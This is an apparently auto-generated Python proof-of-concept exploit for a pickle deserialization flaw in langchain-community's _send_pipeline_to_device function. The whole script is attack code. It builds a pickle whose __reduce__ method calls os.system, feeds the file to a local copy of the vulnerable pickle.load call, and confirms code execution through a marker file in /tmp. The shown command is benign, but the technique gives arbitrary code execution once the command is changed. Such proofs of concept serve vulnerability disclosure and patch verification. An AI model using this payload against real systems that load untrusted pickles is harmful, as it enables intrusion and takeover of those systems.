#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-019
# Sink: _send_pipeline_to_device
# Auto-generated — run with: python3 rce_if_string_opens_calls__send_pipeline_to_device_3.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for langchain-community-only pickle RCE

Vulnerability: The function _send_pipeline_to_device in self_hosted.py
accepts a 'pipeline' parameter. If it's a string, it opens the file and
calls pickle.load() on its contents — no validation or sanitization.

Attack scenario: An attacker who can control the 'pipeline' parameter
(e.g., via a web endpoint that passes user input to this function) can
supply a path to a malicious pickle file, leading to arbitrary code execution.

This PoC:
1. Creates a malicious pickle file that executes a benign command
   (touch /tmp/poc_success.txt)
2. Simulates the vulnerable function call with the path to the malicious file
3. Verifies the command was executed

Usage: python3 poc_exploit.py [--target-path /path/to/malicious.pkl]
"""

import os
import sys
import pickle
import tempfile
import subprocess
import argparse

# ──────────────────────────────────────────────────────────────────────
# Step 1: Create a malicious pickle payload
# ──────────────────────────────────────────────────────────────────────

class MaliciousPickle:
    """A class whose __reduce__ method executes a command during unpickling."""
    
    def __reduce__(self):
        # Benign command: create a marker file to prove RCE
        cmd = "touch /tmp/poc_success.txt"
        return (os.system, (cmd,))

def create_malicious_pickle(filepath: str) -> None:
    """Serialize a malicious object to a pickle file."""
    payload = MaliciousPickle()
    with open(filepath, "wb") as f:
        pickle.dump(payload, f)
    print(f"[+] Created malicious pickle file: {filepath}")

# ──────────────────────────────────────────────────────────────────────
# Step 2: Simulate the vulnerable function
# ──────────────────────────────────────────────────────────────────────

def vulnerable_send_pipeline_to_device(pipeline_path: str) -> None:
    """
    Simulates the vulnerable _send_pipeline_to_device function.
    
    In the real library, this function is called with user-controlled input.
    Here we directly invoke the dangerous code path.
    """
    # This is the exact vulnerable code from self_hosted.py
    if isinstance(pipeline_path, str):
        with open(pipeline_path, "rb") as f:
            pipeline = pickle.load(f)  # <-- RCE happens here
    
    # The rest of the function is irrelevant for exploitation
    print("[+] Pickle deserialization completed (RCE triggered)")

# ──────────────────────────────────────────────────────────────────────
# Step 3: Main exploit logic
# ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="PoC for langchain-community-only pickle RCE"
    )
    parser.add_argument(
        "--target-path",
        default=None,
        help="Path to write malicious pickle file (default: temp file)"
    )
    args = parser.parse_args()

    # Determine where to write the malicious pickle
    if args.target_path:
        pickle_path = args.target_path
    else:
        # Use a temporary file
        fd, pickle_path = tempfile.mkstemp(suffix=".pkl")
        os.close(fd)

    # Clean up any previous marker
    marker = "/tmp/poc_success.txt"
    if os.path.exists(marker):
        os.remove(marker)

    try:
        # Step 1: Create the malicious pickle
        create_malicious_pickle(pickle_path)
        
        # Step 2: Trigger the vulnerability
        print(f"[*] Triggering pickle.load() on: {pickle_path}")
        vulnerable_send_pipeline_to_device(pickle_path)
        
        # Step 3: Verify RCE
        if os.path.exists(marker):
            print(f"[+] SUCCESS: RCE confirmed! Marker file created: {marker}")
            print("[+] The command 'touch /tmp/poc_success.txt' was executed.")
        else:
            print("[-] FAILED: Marker file not found. RCE may not have worked.")
            sys.exit(1)
            
    except Exception as e:
        print(f"[-] Error during exploitation: {e}")
        sys.exit(1)
    finally:
        # Clean up the malicious pickle file
        if os.path.exists(pickle_path):
            os.remove(pickle_path)
            print(f"[*] Cleaned up malicious pickle: {pickle_path}")

if __name__ == "__main__":
    main()
